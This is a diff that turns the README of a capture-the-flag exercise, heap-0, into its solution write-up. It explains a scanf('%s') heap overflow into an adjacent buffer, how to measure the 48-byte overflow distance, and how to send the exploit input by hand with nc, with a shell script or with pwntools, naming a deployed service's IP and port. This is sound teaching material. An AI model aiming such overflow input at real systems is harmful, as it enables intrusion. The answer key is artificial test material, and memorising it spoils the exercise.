@@ -1,23 +1,27 @@
-# Exercise: Overflow a Heap Buffer (heap-0)
+# Exercise: Overflow a Heap Buffer (heap-0) — Solution
 
-**Tools:** GDB, pwntools, Docker
+**Tools:** nc, GDB, pwntools
+
+This is the solving write-up, for a challenge that is already deployed.
+How the challenge is built and deployed is in [`README.chall.md`](README.chall.md).
+It is the first core challenge, and the twin of [`demo-heap-0`](../demo-heap-0) — same bug, a different overflow distance.
 
 ## Goal
 
-Reference solution for heap-0.
-The challenge is the simplest possible heap overflow: two heap buffers sit next to each other, one is writable without a length check, and writing past it corrupts the other.
+Overflow `input_data` so it spills into `safe_var`, which wins as soon as it is no longer `"bico"`.
 
-## Background
+## The bug
 
-`init()` allocates two adjacent 5-byte buffers:
+`init()` allocates two adjacent heap buffers:
 
 ```c
 input_data = malloc(INPUT_DATA_SIZE);   /* "pico" */
 safe_var   = malloc(SAFE_VAR_SIZE);     /* "bico" */
 ```
 
-`safe_var` is the target.
-The win condition is inverted on purpose — `check_win()` prints the flag as soon as `safe_var` is anything other than its starting value `"bico"`, and nothing in the program ever assigns to it:
+`write_buffer()` copies your input into `input_data` with `scanf("%s", input_data)`, which stops at whitespace, never at the buffer size.
+So a long enough write runs off the end of `input_data` and into `safe_var`, which the allocator placed right after it.
+The win condition is inverted on purpose — `check_win()` prints the flag as soon as `safe_var` is anything other than `"bico"`, and nothing in the program ever assigns to it:
 
 ```c
 if (strcmp(safe_var, "bico") != 0) {
@@ -25,44 +29,56 @@ if (strcmp(safe_var, "bico") != 0) {
 }
 ```
 
-## The bug
+So any overwrite wins.
 
-`write_buffer()` copies player input into `input_data` with `scanf("%s", input_data)`, which stops at whitespace, never at `INPUT_DATA_SIZE`.
-glibc rounds the 5-byte request up to a minimum usable chunk (0x20 bytes of usable space on a 64-bit build), so anything written past that spills straight into the chunk the allocator placed next: `safe_var`.
+## Finding the overflow distance
 
-## The exploit
-
-The program's *Print Heap* option prints both addresses; their difference is the number of bytes to reach `safe_var`:
+Do not guess it. The program's *Print Heap* option prints both addresses:
 
 ```text
 input_data @ 0x...2b0
-safe_var   @ 0x...2d0     (delta = 0x20 = 32 bytes)
+safe_var   @ 0x...2e0     (difference = 0x30 = 48 bytes)
 ```
 
-So 32 filler bytes reach `safe_var`, and anything non-empty after that overwrites `"bico"`:
+The gap is 48 bytes.
+`INPUT_DATA_SIZE` is 32, so glibc rounds the request up to a 0x30 (48-byte) usable chunk, and `safe_var` starts 48 bytes on.
+This is why the demo's 32 does not work here: the input buffer is bigger, so the neighbour is further away. Measure it.
 
-```python
-OVERFLOW_PAYLOAD = b"A" * 32 + b"XXXX"
+## Solving it
+
+All three forms do the same thing: write 48 filler bytes plus a few more (menu option 2), then print the flag (option 4).
+
+### By hand, over nc
+
+```console
+nc 141.85.224.106 31010
 ```
 
-Write it (menu option 2), then check the win condition (option 4).
-`solve/exploit.py` does exactly this, against a local `./chall` or a remote target.
+1. Choose `1` (Print Heap) and subtract the two addresses to confirm the distance is 48.
+1. Choose `2` (Write to buffer) and send 48 `A`s followed by `XXXX`:
+   `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX`
+1. Choose `4` (Print Flag).
 
-## Build, run and solve
+### Shell script
 
-The only requirement for the whole pipeline is **Docker**; no host compiler or pwntools install is needed.
-Each stage has its own README — follow them in order:
+`solve/solve.sh` builds that input with `printf` and sends it:
 
-* **`build/`** — compiles `chall` in a reproducible Debian image and copies out the exact `libc.so.6` and loader it linked against. Heap layout is an allocator detail, so the matching libc ships with the binary.
-* **`publish/`** — zips the binary and its libc/loader into the archive players receive.
-* **`deploy/`** — serves the binary under `xinetd`, exposed on port `31010`.
-* **`solve/`** — runs `exploit.py` locally, against a local deployment, or against a remote target.
+```console
+./solve.sh                      # against a local ./chall (uses the placeholder flag.txt)
+./solve.sh 141.85.224.106 31010 # against the deployed service
+```
 
-The `flag` in this directory is copied into the container as `flag.txt` at deploy time; the program reads it with `fopen("flag.txt", ...)` relative to its working directory.
+### pwntools
+
+`solve/exploit.py` does the same in Python, with the payload `b"A" * 48 + b"XXXX"`:
+
+```console
+python3 exploit.py                                   # local ./chall
+python3 exploit.py REMOTE HOST=141.85.224.106 PORT=31010
+```
 
 ## References
 
 * `man 3 scanf` — `%s` and why it needs a field width
 * `man 3 malloc` — chunk sizes and rounding
 * [pwntools documentation](https://docs.pwntools.com/)
-* Original challenge: <https://learn.cylabacademy.org/library/438>
